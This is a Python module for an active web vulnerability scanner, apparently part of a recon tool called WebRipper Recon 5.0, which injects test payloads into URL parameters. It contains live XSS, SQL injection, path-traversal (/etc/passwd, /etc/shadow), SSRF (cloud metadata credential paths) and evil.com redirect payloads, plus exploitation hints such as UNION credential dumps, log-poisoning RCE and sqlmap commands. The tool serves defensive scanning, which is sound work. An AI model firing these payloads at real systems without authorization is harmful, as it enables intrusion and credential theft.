"""
Active vulnerability scanner for WebRipper Recon 5.0.

Actually TESTS for vulnerabilities by sending payloads and analyzing responses.
This is what separates a recon tool from a real vulnerability scanner.

Tests: XSS (reflected), SQLi (error-based + boolean-blind), SSRF, LFI, Open Redirect.
Reports initial candidate findings (LIKELY / POSSIBLE); verification with proof is handled by the validator layer.
"""

from __future__ import annotations

import asyncio
import html as html_module
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import aiohttp

from .base import BaseScanner
from ..models import Finding, ScanResult, Severity


# ---------------------------------------------------------------------------
# Payloads — carefully crafted for detection, not damage
# ---------------------------------------------------------------------------

# XSS: unique canary that shouldn't appear naturally
_XSS_CANARY = "wrx7k9q"
_XSS_PAYLOADS = [
    f'<img src=x onerror={_XSS_CANARY}>',
    f'"><svg onload={_XSS_CANARY}>',
    f"'><script>{_XSS_CANARY}</script>",
    f"javascript:{_XSS_CANARY}//",
    f'{_XSS_CANARY}"onmouseover="',
]

# SQLi: payloads that trigger detectable errors
_SQLI_ERROR_PAYLOADS = [
    ("'", "Single quote injection"),
    ("' OR '1'='1", "Boolean OR injection"),
    ("1' AND '1'='2", "Boolean AND false"),
    ("' UNION SELECT NULL--", "UNION injection"),
    ("1; SELECT 1--", "Stacked query probe"),
]

# SQL error signatures in responses
_SQLI_ERROR_PATTERNS = re.compile(
    r"(?:SQL syntax.*MySQL|mysql_fetch|Warning.*\Wmysqli?_"
    r"|valid MySQL result|MySqlClient\.|PostgreSQL.*ERROR"
    r"|pg_query|pg_exec|syntax error at or near"
    r"|unterminated quoted string|Npgsql\."
    r"|Microsoft.*ODBC.*Driver|ODBC.*SQL Server"
    r"|ORA-\d{5}|Oracle.*Driver|PLS-\d{4}"
    r"|SQLite3?::|\[SQLITE_ERROR\]"
    r"|SQL Server.*\bError|unclosed quotation mark"
    r"|quoted string not properly terminated"
    r"|com\.mysql\.jdbc|org\.postgresql\.util\.PSQLException)",
    re.IGNORECASE,
)

# LFI: path traversal payloads
_LFI_PAYLOADS = [
    ("../../etc/passwd", "root:x:0:0:"),
    ("..\\..\\windows\\win.ini", "[extensions]"),
    ("....//....//etc/passwd", "root:x:0:0:"),
    ("/etc/passwd", "root:x:0:0:"),
]

# SSRF: internal address probes
_SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://[::1]:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
]

# Open Redirect: redirect to external domain
_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
]


# ---------------------------------------------------------------------------
# Parameter extraction from crawled data
# ---------------------------------------------------------------------------

def _extract_params_from_url(url: str) -> List[Tuple[str, str, str]]:
    """Extract (base_url, param_name, original_value) from URL query string."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    results = []
    for name, values in params.items():
        results.append((base, name, values[0] if values else ""))
    return results


def _inject_param(base_url: str, all_params: Dict[str, str],
                  target_param: str, payload: str) -> str:
    """Build a URL with one parameter replaced by payload, others preserved."""
    params = dict(all_params)
    params[target_param] = payload
    return f"{base_url}?{urlencode(params)}"


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class VulnScanner(BaseScanner):
    """Active vulnerability scanner — sends payloads, verifies exploitability."""

    @property
    def name(self) -> str:
        return "vulns"

    @property
    def description(self) -> str:
        return "Active vulnerability testing (XSS, SQLi, SSRF, LFI, Open Redirect)"

    def scan(self) -> ScanResult:
        start = time.time()

        # Collect all testable URLs with parameters
        targets = self._collect_targets()
        if not targets:
            self._log("No parameterized URLs found to test")
            return self._build_result(start, tested=0)

        self._log(f"Active vuln testing: {len(targets)} parameterized endpoints")

        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._run_tests(targets))
            loop.close()
        except Exception as e:
            self._log(f"Vuln scanner error: {e}")

        likely = sum(1 for f in self._findings if f.confidence == "LIKELY")
        possible = sum(1 for f in self._findings if f.confidence == "POSSIBLE")
        self._log(f"Vuln scan complete: {likely} likely, {possible} possible, "
                  f"{len(self._findings)} total candidate findings")

        return self._build_result(
            start,
            tested=len(targets),
            likely=likely,
            possible=possible,
        )

    def _collect_targets(self) -> List[Dict]:
        """Collect parameterized URLs from crawled files and endpoint scanner."""
        targets: List[Dict] = []
        seen: Set[str] = set()

        # From crawled pages with query parameters
        for f in self._report.files:
            if not f.url or f.error:
                continue
            parsed = urlparse(f.url)
            if not parsed.query:
                continue
            params = parse_qs(parsed.query, keep_blank_values=True)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param_name in params:
                key = f"{base}|{param_name}"
                if key not in seen:
                    seen.add(key)
                    targets.append({
                        "base_url": base,
                        "param": param_name,
                        "original": params[param_name][0] if params[param_name] else "",
                        "all_params": {k: v[0] if v else "" for k, v in params.items()},
                        "source": "crawled",
                    })

        # From forms with GET actions
        for f in self._report.files:
            if not f.url or f.error:
                continue
            try:
                if f.local_path and f.local_path.endswith((".html", ".htm", ".php")):
                    with open(f.local_path, "r", encoding="utf-8", errors="ignore") as fh:
                        content = fh.read(500_000)
                    # Extract form actions and input names
                    for form_match in re.finditer(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',
                                                  content, re.I | re.S):
                        action = form_match.group(1)
                        form_body = form_match.group(2)
                        method = "GET"
                        method_m = re.search(r'method=["\'](\w+)["\']', form_match.group(0), re.I)
                        if method_m:
                            method = method_m.group(1).upper()

                        input_names = re.findall(r'name=["\']([^"\']+)["\']', form_body, re.I)
                        if input_names and method == "GET":
                            full_action = urljoin(f.url, action)
                            for inp in input_names:
                                key = f"{full_action}|{inp}"
                                if key not in seen:
                                    seen.add(key)
                                    targets.append({
                                        "base_url": full_action,
                                        "param": inp,
                                        "original": "",
                                        "all_params": {n: "" for n in input_names},
                                        "source": "form",
                                    })
            except (OSError, IOError):
                continue

        # From captured network requests (XHR / Fetch / API calls observed at runtime)
        captured = getattr(self._report, "captured_requests", [])
        for req in captured:
            u = req.get("url", "")
            if not u:
                continue
            parsed = urlparse(u)
            if not parsed.query:
                continue
            params = parse_qs(parsed.query, keep_blank_values=True)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param_name in params:
                key = f"{base}|{param_name}"
                if key not in seen:
                    seen.add(key)
                    targets.append({
                        "base_url": base,
                        "param": param_name,
                        "original": params[param_name][0] if params[param_name] else "",
                        "all_params": {k: v[0] if v else "" for k, v in params.items()},
                        "source": "network_capture",
                    })

        # From recon findings (e.g. EndpointScanner)
        if self._recon and hasattr(self._recon, 'scan_results'):
            for sr in self._recon.scan_results:
                for f in sr.findings:
                    if f.category == "endpoints" and f.title.startswith("/") and "?" in f.title:
                        parsed = urlparse(f.title)
                        params = parse_qs(parsed.query, keep_blank_values=True)
                        full_base = urljoin(self._settings.url, parsed.path)
                        for param_name in params:
                            key = f"{full_base}|{param_name}"
                            if key not in seen:
                                seen.add(key)
                                targets.append({
                                    "base_url": full_base,
                                    "param": param_name,
                                    "original": params[param_name][0] if params[param_name] else "",
                                    "all_params": {k: v[0] if v else "" for k, v in params.items()},
                                    "source": "endpoints_scanner",
                                })

        return targets[:100]  # Cap to prevent excessive testing

    async def _run_tests(self, targets: List[Dict]) -> None:
        """Run all vulnerability tests against collected targets."""
        timeout = aiohttp.ClientTimeout(total=min(self._settings.timeout, 10))
        connector = aiohttp.TCPConnector(ssl=False)
        headers = self._build_headers()

        proxy = self._get_proxy()

        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=headers,
            max_line_size=131072,
            max_field_size=131072,
        ) as session:
            sem = asyncio.Semaphore(5)  # Conservative to avoid overwhelming target

            for i, target in enumerate(targets):
                if i % 10 == 0:
                    self._log(f"  Testing {i+1}/{len(targets)}: {target['param']}@{target['base_url'][:50]}")

                if self._settings.delay > 0:
                    await asyncio.sleep(self._settings.delay)

                await self._test_xss(session, sem, target, proxy)
                await self._test_sqli(session, sem, target, proxy)
                await self._test_lfi(session, sem, target, proxy)
                await self._test_ssrf(session, sem, target, proxy)
                await self._test_redirect(session, sem, target, proxy)

    # ------------------------------------------------------------------
    # XSS Testing
    # ------------------------------------------------------------------

    async def _test_xss(self, session, sem, target, proxy) -> None:
        """Test for reflected XSS by injecting payloads and checking reflection."""
        async with sem:
            for payload in _XSS_PAYLOADS:
                url = _inject_param(
                    target["base_url"], target["all_params"],
                    target["param"], payload,
                )
                try:
                    async with session.get(url, allow_redirects=True, proxy=proxy) as resp:
                        if resp.status != 200:
                            continue
                        body = await resp.text(errors="ignore")

                        # VERIFIED: our canary appears in an unescaped script/event context
                        if _XSS_CANARY in body:
                            # Check it's actually reflected unescaped in dangerous context
                            reflected_dangerous = (
                                f"<img src=x onerror={_XSS_CANARY}>" in body or
                                f"<svg onload={_XSS_CANARY}>" in body or
                                f"<script>{_XSS_CANARY}</script>" in body or
                                f"javascript:{_XSS_CANARY}" in body or
                                f'onmouseover="{_XSS_CANARY}' in body or
                                (f"onerror={_XSS_CANARY}" in body and "&lt;" not in body.split(_XSS_CANARY)[0][-50:])
                            )

                            if reflected_dangerous:
                                confidence = "LIKELY"
                                desc = (f"Reflected XSS candidate. Payload reflected in executable context. "
                                        f"Parameter '{target['param']}' directly injects into HTML without sanitization.")
                            else:
                                confidence = "POSSIBLE"
                                desc = (f"XSS canary reflected in response but may be HTML-encoded. "
                                        f"Parameter '{target['param']}' reflects user input — manual verification needed.")

                            self._add_finding(Finding(
                                severity=Severity.HIGH if confidence == "LIKELY" else Severity.MEDIUM,
                                category="vulns",
                                title=f"XSS: {target['param']} @ {urlparse(target['base_url']).path}",
                                description=desc,
                                evidence=f"Payload: {payload}\nURL: {url[:200]}\nReflection found in response body",
                                url=url[:500],
                                confidence=confidence,
                                remediation="Sanitize all user input on output. Use Content-Security-Policy header. "
                                            "Encode with context-appropriate escaping (HTML entities, JS escaping, URL encoding).",
                                metadata={
                                    "vuln_type": "Reflected XSS",
                                    "parameter": target["param"],
                                    "payload": payload,
                                    "exploit": f"Inject {payload} into '{target['param']}' parameter. "
                                               f"Payload executes JavaScript in victim's browser when they visit the crafted URL. "
                                               f"Attacker can steal session cookies, redirect to phishing, or perform actions as the victim.",
                                    "impact": "Session hijacking, credential theft, defacement, phishing",
                                    "cwe": "CWE-79",
                                    "owasp": "A03:2021 Injection",
                                    "time_to_exploit": "~2 minutes",
                                },
                            ))
                            return  # One XSS per param is enough

                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue

    # ------------------------------------------------------------------
    # SQL Injection Testing
    # ------------------------------------------------------------------

    async def _test_sqli(self, session, sem, target, proxy) -> None:
        """Test for SQL injection by detecting error messages and boolean differences."""
        async with sem:
            # First, get baseline response with original value
            baseline_url = _inject_param(
                target["base_url"], target["all_params"],
                target["param"], target["original"],
            )
            baseline_len = 0
            try:
                async with session.get(baseline_url, allow_redirects=True, proxy=proxy) as resp:
                    baseline_body = await resp.text(errors="ignore")
                    baseline_len = len(baseline_body)
            except Exception:
                return

            # Test error-based SQLi
            for payload, desc_name in _SQLI_ERROR_PAYLOADS:
                url = _inject_param(
                    target["base_url"], target["all_params"],
                    target["param"], payload,
                )
                try:
                    async with session.get(url, allow_redirects=True, proxy=proxy) as resp:
                        body = await resp.text(errors="ignore")

                        # Check for SQL error signatures
                        match = _SQLI_ERROR_PATTERNS.search(body)
                        if match:
                            self._add_finding(Finding(
                                severity=Severity.CRITICAL,
                                category="vulns",
                                title=f"SQLi: {target['param']} @ {urlparse(target['base_url']).path}",
                                description=f"SQL injection CONFIRMED via error-based detection. "
                                            f"Parameter '{target['param']}' passes unsanitized input to SQL query. "
                                            f"Database error message exposed: {match.group(0)[:100]}",
                                evidence=f"Payload: {payload}\nSQL Error: {match.group(0)[:200]}\nURL: {url[:200]}",
                                url=url[:500],
                                confidence="LIKELY",
                                remediation="Use parameterized queries (prepared statements) for ALL database interactions. "
                                            "Never concatenate user input into SQL strings. Use an ORM.",
                                metadata={
                                    "vuln_type": f"SQL Injection (error-based: {desc_name})",
                                    "parameter": target["param"],
                                    "payload": payload,
                                    "sql_error": match.group(0)[:200],
                                    "exploit": f"Inject SQL payloads into '{target['param']}' parameter. "
                                               f"Error-based: extract data via error messages. "
                                               f"UNION-based: SELECT data from other tables. "
                                               f"Example: ' UNION SELECT username,password FROM users--",
                                    "impact": "Full database access — read/write/delete all data, potential RCE via xp_cmdshell or INTO OUTFILE",
                                    "cwe": "CWE-89",
                                    "owasp": "A03:2021 Injection",
                                    "time_to_exploit": "~5 minutes with sqlmap",
                                },
                            ))
                            return  # One SQLi per param is enough

                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue

            # Test boolean-blind SQLi: compare true vs false conditions
            true_payload = f"{target['original']}' OR '1'='1"
            false_payload = f"{target['original']}' AND '1'='2"
            try:
                true_url = _inject_param(target["base_url"], target["all_params"], target["param"], true_payload)
                false_url = _inject_param(target["base_url"], target["all_params"], target["param"], false_payload)

                async with session.get(true_url, allow_redirects=True, proxy=proxy) as resp:
                    true_body = await resp.text(errors="ignore")
                    true_len = len(true_body)

                async with session.get(false_url, allow_redirects=True, proxy=proxy) as resp:
                    false_body = await resp.text(errors="ignore")
                    false_len = len(false_body)

                # If true and false responses differ significantly, and true matches baseline
                if (abs(true_len - baseline_len) < baseline_len * 0.1 and
                    abs(false_len - baseline_len) > baseline_len * 0.2):
                    self._add_finding(Finding(
                        severity=Severity.HIGH,
                        category="vulns",
                        title=f"SQLi (blind): {target['param']} @ {urlparse(target['base_url']).path}",
                        description=f"Possible boolean-blind SQL injection. "
                                    f"TRUE condition returns {true_len} bytes (similar to baseline {baseline_len}), "
                                    f"FALSE condition returns {false_len} bytes (different). "
                                    f"This suggests the parameter is used in a SQL WHERE clause.",
                        evidence=f"Baseline: {baseline_len}b, TRUE: {true_len}b, FALSE: {false_len}b",
                        url=true_url[:500],
                        confidence="LIKELY",
                        remediation="Use parameterized queries. Verify manually with sqlmap.",
                        metadata={
                            "vuln_type": "SQL Injection (boolean-blind)",
                            "parameter": target["param"],
                            "baseline_size": baseline_len,
                            "true_size": true_len,
                            "false_size": false_len,
                            "exploit": f"Boolean-blind SQLi in '{target['param']}'. "
                                       f"Use sqlmap: sqlmap -u '{target['base_url']}?{target['param']}=test' --dbs",
                            "impact": "Full database extraction via boolean inference",
                            "cwe": "CWE-89",
                            "owasp": "A03:2021 Injection",
                            "time_to_exploit": "~10 minutes with sqlmap",
                        },
                    ))
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass

    # ------------------------------------------------------------------
    # LFI Testing
    # ------------------------------------------------------------------

    async def _test_lfi(self, session, sem, target, proxy) -> None:
        """Test for Local File Inclusion via path traversal."""
        # Only test params that look like they could be file-related
        param_lower = target["param"].lower()
        file_params = ("file", "path", "page", "include", "template", "doc",
                       "folder", "dir", "load", "read", "download", "view",
                       "content", "module", "name", "url", "src", "img")
        if not any(fp in param_lower for fp in file_params):
            return

        async with sem:
            for payload, signature in _LFI_PAYLOADS:
                url = _inject_param(
                    target["base_url"], target["all_params"],
                    target["param"], payload,
                )
                try:
                    async with session.get(url, allow_redirects=True, proxy=proxy) as resp:
                        if resp.status != 200:
                            continue
                        body = await resp.text(errors="ignore")
                        if signature in body:
                            self._add_finding(Finding(
                                severity=Severity.CRITICAL,
                                category="vulns",
                                title=f"LFI: {target['param']} @ {urlparse(target['base_url']).path}",
                                description=f"Local File Inclusion CONFIRMED. "
                                            f"Parameter '{target['param']}' reads arbitrary files from the server. "
                                            f"Successfully read system file via path traversal.",
                                evidence=f"Payload: {payload}\nSignature found: {signature}\nURL: {url[:200]}",
                                url=url[:500],
                                confidence="LIKELY",
                                remediation="Never use user input in file paths. Use a whitelist of allowed files. "
                                            "If dynamic file loading is needed, use an ID→filename mapping, not raw paths.",
                                metadata={
                                    "vuln_type": "Local File Inclusion",
                                    "parameter": target["param"],
                                    "payload": payload,
                                    "file_read": signature,
                                    "exploit": f"Read any file: ?{target['param']}=../../etc/shadow for password hashes. "
                                               f"Log poisoning → RCE: inject PHP into access.log then include it. "
                                               f"PHP filter chain for source code: php://filter/convert.base64-encode/resource=config.php",
                                    "impact": "Arbitrary file read, potential RCE via log poisoning or PHP wrappers",
                                    "cwe": "CWE-98",
                                    "owasp": "A03:2021 Injection",
                                    "time_to_exploit": "~3 minutes",
                                },
                            ))
                            return
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue

    # ------------------------------------------------------------------
    # SSRF Testing
    # ------------------------------------------------------------------

    async def _test_ssrf(self, session, sem, target, proxy) -> None:
        """Test for Server-Side Request Forgery."""
        param_lower = target["param"].lower()
        url_params = ("url", "uri", "link", "href", "src", "redirect", "next",
                      "target", "dest", "callback", "return", "fetch", "proxy",
                      "webhook", "endpoint", "host", "site", "feed", "api")
        if not any(up in param_lower for up in url_params):
            return

        async with sem:
            for ssrf_url in _SSRF_PAYLOADS:
                url = _inject_param(
                    target["base_url"], target["all_params"],
                    target["param"], ssrf_url,
                )
                try:
                    async with session.get(url, allow_redirects=True, proxy=proxy) as resp:
                        body = await resp.text(errors="ignore")
                        # Check for signs the server made an internal request
                        if ("169.254.169.254" in ssrf_url and
                            ("ami-id" in body or "instance-id" in body or "iam" in body.lower())):
                            confidence = "LIKELY"
                            desc = "AWS metadata endpoint accessible via SSRF — instance credentials exposed"
                        elif resp.status == 200 and len(body) > 100 and any(h in ssrf_url for h in ("localhost", "127.0.0.1", "[::1]")):
                            # Verify indicator was not present in target original
                            orig_url = _inject_param(target["base_url"], target["all_params"], target["param"], target["original"])
                            orig_has_sig = False
                            try:
                                async with session.get(orig_url, allow_redirects=True, proxy=proxy) as orig_resp:
                                    orig_body = (await orig_resp.text(errors="ignore")).lower()
                                    if "127.0.0.1" in orig_body or "root:" in orig_body:
                                        orig_has_sig = True
                            except Exception:
                                pass

                            if not orig_has_sig and ("127.0.0.1" in body or "root:" in body):
                                confidence = "LIKELY"
                                desc = f"SSRF likely — server fetched internal content from {ssrf_url}"
                            else:
                                continue
                        else:
                            continue

                        self._add_finding(Finding(
                            severity=Severity.HIGH,
                            category="vulns",
                            title=f"SSRF: {target['param']} @ {urlparse(target['base_url']).path}",
                            description=f"Server-Side Request Forgery detected. {desc}",
                            evidence=f"Payload: {ssrf_url}\nResponse: {len(body)} bytes\nURL: {url[:200]}",
                            url=url[:500],
                            confidence=confidence,
                            remediation="Validate and whitelist allowed URLs/domains. Block internal IP ranges. "
                                        "Use a URL parser to reject private/loopback addresses.",
                            metadata={
                                "vuln_type": "Server-Side Request Forgery",
                                "parameter": target["param"],
                                "payload": ssrf_url,
                                "exploit": f"Access internal services: ?{target['param']}=http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
                                           f"for AWS keys. Scan internal network: ?{target['param']}=http://192.168.1.X:PORT/",
                                "impact": "Internal network access, cloud credential theft, port scanning",
                                "cwe": "CWE-918",
                                "owasp": "A10:2021 SSRF",
                                "time_to_exploit": "~5 minutes",
                            },
                        ))
                        return
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue

    # ------------------------------------------------------------------
    # Open Redirect Testing
    # ------------------------------------------------------------------

    async def _test_redirect(self, session, sem, target, proxy) -> None:
        """Test for open redirect vulnerabilities."""
        param_lower = target["param"].lower()
        redirect_params = ("redirect", "url", "next", "return", "returnto", "goto",
                           "continue", "dest", "destination", "redir", "return_url",
                           "callback", "forward", "out", "view", "target", "rurl")
        if not any(rp in param_lower for rp in redirect_params):
            return

        async with sem:
            for payload in _REDIRECT_PAYLOADS:
                url = _inject_param(
                    target["base_url"], target["all_params"],
                    target["param"], payload,
                )
                try:
                    async with session.get(url, allow_redirects=False, proxy=proxy) as resp:
                        if resp.status in (301, 302, 303, 307, 308):
                            location = resp.headers.get("Location", "")
                            loc_parsed = urlparse(location)
                            loc_host = loc_parsed.netloc.lower()
                            if loc_host and (loc_host == "evil.com" or loc_host.endswith(".evil.com")):
                                self._add_finding(Finding(
                                    severity=Severity.MEDIUM,
                                    category="vulns",
                                    title=f"Open Redirect: {target['param']} @ {urlparse(target['base_url']).path}",
                                    description=f"Open redirect CONFIRMED. "
                                                f"Parameter '{target['param']}' controls the redirect destination. "
                                                f"Server redirects to attacker-controlled URL.",
                                    evidence=f"Payload: {payload}\nLocation: {location}\nURL: {url[:200]}",
                                    url=url[:500],
                                    confidence="LIKELY",
                                    remediation="Validate redirect URLs against a whitelist of allowed domains. "
                                                "Use relative paths for redirects. Never use raw user input in Location header.",
                                    metadata={
                                        "vuln_type": "Open Redirect",
                                        "parameter": target["param"],
                                        "payload": payload,
                                        "redirect_to": location,
                                        "exploit": f"Craft phishing URL: {target['base_url']}?{target['param']}=https://evil.com/login "
                                                   f"Victim sees legitimate domain in URL bar but is redirected to attacker's fake login page. "
                                                   f"Also usable to bypass SSRF filters or chain with OAuth token theft.",
                                        "impact": "Phishing, OAuth token theft, SSRF filter bypass",
                                        "cwe": "CWE-601",
                                        "owasp": "A01:2021 Broken Access Control",
                                        "time_to_exploit": "~1 minute",
                                    },
                                ))
                                return
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue
